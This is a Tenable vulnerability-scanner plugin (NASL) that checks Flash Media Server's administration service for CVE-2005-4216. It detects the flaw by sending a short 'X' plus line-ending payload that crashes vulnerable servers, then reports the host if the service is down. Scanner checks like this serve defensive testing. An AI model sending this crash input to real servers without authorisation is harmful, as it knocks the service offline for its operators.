#
# (C) Tenable Network Security
#


if (description) {
  script_id(20302);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-4216");
  script_bugtraq_id(15822);
 
  script_name(english:"Flash Media Server Administration Service Denial of Service Vulnerability");
  script_summary(english:"Checks for denial of service vulnerability in Flash Media Server Administration Service");
 
 desc = "
Synopsis :

The remote service is prone to a remote denial of service attack. 

Description :

The remote host appears to be using Flash Media Server.

The version of Flash Media Server installed on the remote host
is affected by a flaw in its administration server that causes it to crash
if it receives a single character. The administration server 
is used to remotely administer Flash Media Server, and this flaw
can be used by an attacker to disable access to this service.

See also : 

http://www.ipomonis.com/advisories/Flash_media_server_2.txt

Solution : 

Limit access to this port to trusted users.

Risk factor : 

Low / CVSS Base Score : 3.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:C/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("find_service.nes");
  script_require_ports("Services/www", 1111);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");


port = get_http_port(default:1111);
if (!get_port_state(port)) exit(0);


# If it looks like FMS Administration Server...
banner = get_http_banner(port:port);
if (banner && "Server: FlashCom/" >< banner) {
  # Try to exploit the flaw.
  soc = http_open_socket(port);
  if (soc) {
    # nb: the advisory is wrong about a single character;
    #     it ignores the effect of the line endings.
    send(socket:soc, data:string("X\r\n"));
    res = recv(socket:soc, length:10);

    # There's a problem if the server's down now.
    if (http_is_dead(port:port)) {
      security_note(port);
      exit(0);
    }
    http_close_socket(soc);
  }
}
